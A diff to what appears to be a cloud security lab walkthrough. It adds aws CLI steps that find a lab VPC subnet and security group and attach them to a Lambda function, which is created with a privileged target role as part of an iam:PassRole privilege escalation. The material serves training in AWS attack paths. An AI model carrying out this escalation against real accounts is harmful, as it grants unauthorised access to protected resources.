@@ -81,6 +81,18 @@ The handler does not need to manage credentials explicitly. The Lambda execution
 
 This is the privilege escalation moment. By specifying the target role as the `--role`, you exercise `iam:PassRole` — delegating an IAM identity you don't directly hold to a compute resource you're creating:
 
+Hosted environments run Lambda inside an isolated VPC. Discover the lab's subnet and security group, then include them when you create the function:
+
+```bash
+SUBNET_ID=$(aws ec2 describe-subnets \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-001-to-bucket-subnet" \
+    --query 'Subnets[0].SubnetId' --output text)
+
+SG_ID=$(aws ec2 describe-security-groups \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-001-to-bucket-function-sg" \
+    --query 'SecurityGroups[0].GroupId' --output text)
+```
+
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-bucket-target-role"
@@ -91,7 +103,8 @@ aws lambda create-function \
     --role "$TARGET_ROLE_ARN" \
     --handler lambda_function.lambda_handler \
     --zip-file fileb:///tmp/lambda_function.zip \
-    --timeout 30
+    --timeout 30 \
+    --vpc-config SubnetIds=${SUBNET_ID},SecurityGroupIds=${SG_ID}
 ```
 
 Lambda accepts the request and binds the bucket-access role to the function. From this point forward, every invocation of this function runs as `pl-prod-lambda-001-to-bucket-target-role`.
